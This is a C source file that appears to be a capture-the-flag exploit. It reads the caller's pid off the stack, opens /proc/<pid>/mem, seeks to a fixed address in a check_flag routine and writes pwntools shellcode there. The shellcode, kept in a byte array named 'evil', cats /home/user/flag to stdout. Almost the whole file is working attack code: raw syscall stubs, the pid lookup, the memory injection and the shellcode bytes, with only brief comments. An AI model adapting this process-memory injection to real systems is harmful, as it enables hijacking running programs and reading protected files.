#include <sys/syscall.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>

// stolen from musl:
// https://sourcegraph.com/github.com/ifduyue/musl@master/-/blob/arch/x86_64/syscall_arch.h#L1:11
static inline long syscall0(long n)
{
    unsigned long ret;
    __asm__ __volatile__ ("syscall" : "=a"(ret) : "a"(n) : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall1(long n, long a1)
{
    unsigned long ret;
    __asm__ __volatile__ ("syscall" : "=a"(ret) : "a"(n), "D"(a1) : "rcx", "r11", "memory");
    return ret;
}

static inline long syscall2(long n, long a1, long a2)
{
    unsigned long ret;
    __asm__ __volatile__ ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2) : "rcx", "r11", "memory");
    return ret;
}

static __inline long syscall3(long n, long a1, long a2, long a3)
{
    unsigned long ret;
    __asm__ __volatile__ ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2),
                        "d"(a3) : "rcx", "r11", "memory");
    return ret;
}

static void itoa_badly(int i, char *a) {
    while (i > 0) {
        *a = (i % 10) + '0';
        i /= 10;
        --a;
    }
}

__attribute__((section(".text.prologue")))
void _start () {
    int pid;
    // well, we weren't allowed getpid so,
    // steal the pid from the caller's stack
    __asm__ __volatile__ (
        "mov %0, dword ptr [rbp - 0x4]\n"
        : "=r"(pid) ::);
    char pathbuf[64] = "/proc////////////mem";
    itoa_badly(pid, &pathbuf[15]);

    int fd = syscall2(SYS_open, (uint64_t)(void *)pathbuf, O_RDWR);

    /* disassemble check_flag
     * (...)
     * 0x00000000004022d9 <+167>:   mov    edi,0x1
     * 0x00000000004022de <+172>:   call   0x44f2e0 <sleep>
     * 0x00000000004022e3 <+177>:   jmp    0x40223a <check_flag+8>
     */
    void *tgt = (void *)0x4022e3;
    syscall3(SYS_lseek, fd, (uint64_t)tgt, SEEK_SET);

    //////////////////////////////////////////////////////////////
    // Now, just write shellcode into memory at the injection point.
    /*
     * In [4]: sh = shellcraft.amd64.cat('/home/user/flag', 1) + shellcraft.amd64.infloop()
     * In [5]: print(sh)
     *     / * push b'/home/user/flag\x00' * /
     *     mov rax, 0x101010101010101
     *     push rax
     *     mov rax, 0x101010101010101 ^ 0x67616c662f7265
     *     xor [rsp], rax
     *     mov rax, 0x73752f656d6f682f
     *     push rax
     *     / * call open('rsp', 'O_RDONLY', 0) * /
     *     push SYS_open / * 2 * /
     *     pop rax
     *     mov rdi, rsp
     *     xor esi, esi / * O_RDONLY * /
     *     cdq / * rdx=0 * /
     *     syscall
     *     / * call sendfile(1, 'rax', 0, 2147483647) * /
     *     mov r10d, 0x7fffffff
     *     mov rsi, rax
     *     push SYS_sendfile / * 0x28 * /
     *     pop rax
     *     push 1
     *     pop rdi
     *     cdq / * rdx=0 * /
     *     syscall
     *     jmp $
     * In [6]: asm(sh)
     * Out[6]: b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8ds.gm`f\x01H1\x04$H\xb8/home/usPj\x02XH\x89\xe71\xf6\x99\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(X
     * j\x01_\x99\x0f\x05\xeb\xfe'
     *
     * In [7]: [hex(x) for x in asm(sh)]
     */
    char evil[] = {0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x50,
        0x48, 0xb8, 0x64, 0x73, 0x2e, 0x67, 0x6d, 0x60, 0x66, 0x1, 0x48, 0x31,
        0x4, 0x24, 0x48, 0xb8, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x75, 0x73,
        0x50, 0x6a, 0x2 , 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x99, 0xf, 0x5,
        0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a , 0x28,
        0x58, 0x6a, 0x1, 0x5f, 0x99, 0xf, 0x5, 0xeb, 0xfe};

    syscall3(SYS_write, fd, (uint64_t)(void *)evil, sizeof (evil));
    while (1) { }
}
